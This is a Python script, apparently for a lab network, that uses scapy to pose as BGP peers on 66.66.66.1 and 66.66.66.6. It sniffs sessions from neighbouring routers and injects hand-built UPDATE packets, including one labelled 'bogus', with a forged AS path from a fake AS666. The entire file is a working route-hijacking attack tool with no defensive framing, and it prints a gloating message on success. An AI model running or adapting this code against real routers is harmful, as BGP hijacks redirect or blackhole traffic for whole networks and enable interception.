#!/usr/bin/python

import socket
import time
import thread
from scapy.all import *
from bgp import *

bgp_open = '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x3b\x01\x04\x02\x9a\x00\xb4\x42\x42\x42\x06\x1e\x02\x06\x01\x04\x00\x01\x00\x01\x02\x02\x80\x00\x02\x02\x02\x00\x02\x06\x41\x04\x00\x00\x02\x9a\x02\x04\x40\x02\x80\x78'
bgp_keepalive = '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x13\x04'

updateAS666_toAS10 = '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x35\x02\x00\x00\x00\x1c\x40\x01\x01\x00\x50\x02\x00\x06\x02\x01\x00\x00\x02\x9a\x40\x03\x04\x42\x42\x42\x06\x80\x04\x04\x00\x00\x00\x00\x08\x42'
updateAS30_toAS10 = '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x32\x02\x00\x00\x00\x19\x40\x01\x01\x00\x50\x02\x00\x0a\x02\x02\x00\x00\x02\x9a\x00\x00\x00\x1e\x40\x03\x04\x42\x42\x42\x06\x08\x1e'
updateAS777_toAS10 = '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x3d\x02\x00\x00\x00\x24\x40\x01\x01\x00\x50\x02\x00\x0e\x02\x03\x00\x00\x02\x9a\x00\x00\x00\x1e\x00\x00\x03\x09\x40\x03\x04\x42\x42\x42\x06\x80\x04\x04\x00\x00\x00\x00\x08\x4d'
bogusUpdateAS777_toAS10 = '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x39\x02\x00\x00\x00\x20\x40\x01\x01\x00\x50\x02\x00\x0a\x02\x02\x00\x00\x00\x1e\x00\x00\x03\x09\x40\x03\x04\x42\x42\x42\x06\x80\x04\x04\x00\x00\x00\x00\x08\x4d'

updateAS666_toAS30 = '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x35\x02\x00\x00\x00\x1c\x40\x01\x01\x00\x50\x02\x00\x06\x02\x01\x00\x00\x02\x9a\x40\x03\x04\x42\x42\x42\x01\x80\x04\x04\x00\x00\x00\x00\x08\x42'
updateAS10_toAS30 = '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x32\x02\x00\x00\x00\x19\x40\x01\x01\x00\x50\x02\x00\x0a\x02\x02\x00\x00\x02\x9a\x00\x00\x00\x0a\x40\x03\x04\x42\x42\x42\x01\x08\x0b'
updateAS20_toAS30 = '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x36\x02\x00\x00\x00\x1d\x40\x01\x01\x00\x50\x02\x00\x0e\x02\x03\x00\x00\x02\x9a\x00\x00\x00\x0a\x00\x00\x00\x14\x40\x03\x04\x42\x42\x42\x01\x08\x14'

updateToAS10sent = False
updateToAS30sent = False


def listen_bgp(ip):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.bind((ip, 179))
	s.listen(1)
	conn, addr = s.accept()
	print '.\nTCP session established with:', addr
	while 1:
		continue
	conn.close()


def stopfilter(x):
    if x[TCP].flags == 25 and (x[IP].src == '66.66.66.5' or x[IP].src == '66.66.66.2'):
        return True
    else:
        return False


def packet_handler(pkt):

	global updateToAS10sent, updateToAS30sent

	if ((pkt[IP].src == '66.66.66.5') or (pkt[IP].src == '66.66.66.2')):
		if str(pkt.summary()).find("BGPHeader") > 0:

			ip_total_len = pkt.getlayer(IP).len
			ip_header_len = pkt.getlayer(IP).ihl * 32 / 8
			tcp_header_len = pkt.getlayer(TCP).dataofs * 32 / 8
			tcp_seg_len = ip_total_len - ip_header_len - tcp_header_len

			# BGP OPEN
			if pkt[BGPHeader].type == 1:
				send(IP(dst=pkt[IP].src,ttl=1)/TCP(sport=pkt[TCP].dport,dport=pkt[TCP].sport,ack=pkt[TCP].seq+tcp_seg_len,seq=pkt[TCP].ack,flags="PA")/bgp_open/bgp_keepalive)
				return "Open sent to " + pkt[IP].src

			# BGP UPDATE
			elif pkt[BGPHeader].type == 2:
				if pkt[IP].src == '66.66.66.5' and not updateToAS10sent:
					send(IP(dst=pkt[IP].src,ttl=1)/TCP(sport=pkt[TCP].dport,dport=pkt[TCP].sport,ack=pkt[TCP].seq+tcp_seg_len,seq=pkt[TCP].ack,flags="PA")/bogusUpdateAS777_toAS10/updateAS666_toAS10/updateAS30_toAS10)
					updateToAS10sent = True
					return "###########################################\n### BOGUS UPDATE SENT TO 66.66.66.5 :D  ###\n###########################################"
				elif pkt[IP].src == '66.66.66.2' and not updateToAS30sent:
					send(IP(dst=pkt[IP].src,ttl=1)/TCP(sport=pkt[TCP].dport,dport=pkt[TCP].sport,ack=pkt[TCP].seq+tcp_seg_len,seq=pkt[TCP].ack,flags="PA")/updateAS20_toAS30/updateAS10_toAS30/updateAS666_toAS30)
					updateToAS30sent = True
					return "Update sent to 66.66.66.2"
				else:
					send(IP(dst=pkt[IP].src,ttl=1)/TCP(sport=pkt[TCP].dport,dport=pkt[TCP].sport,ack=pkt[TCP].seq+tcp_seg_len,seq=pkt[TCP].ack,flags="PA")/bgp_keepalive)
					return "Update reply sent to " + pkt[IP].src

			# BGP NOTIFICATION
			elif pkt[BGPHeader].type == 3:
				return "Notification Received from " + pkt[IP].src

			# BGP KEEPALIVE
			else:
				send(IP(dst=pkt[IP].src,ttl=1)/TCP(sport=pkt[TCP].dport,dport=pkt[TCP].sport,ack=pkt[TCP].seq+tcp_seg_len,seq=pkt[TCP].ack,flags="PA")/bgp_keepalive)
				return "Keep_alive sent to " + pkt[IP].src


def main():
	thread.start_new_thread(listen_bgp, ('66.66.66.1',))
	thread.start_new_thread(listen_bgp, ('66.66.66.6',))
	sniff(filter='tcp', stop_filter=stopfilter, store=0, prn=packet_handler)


main()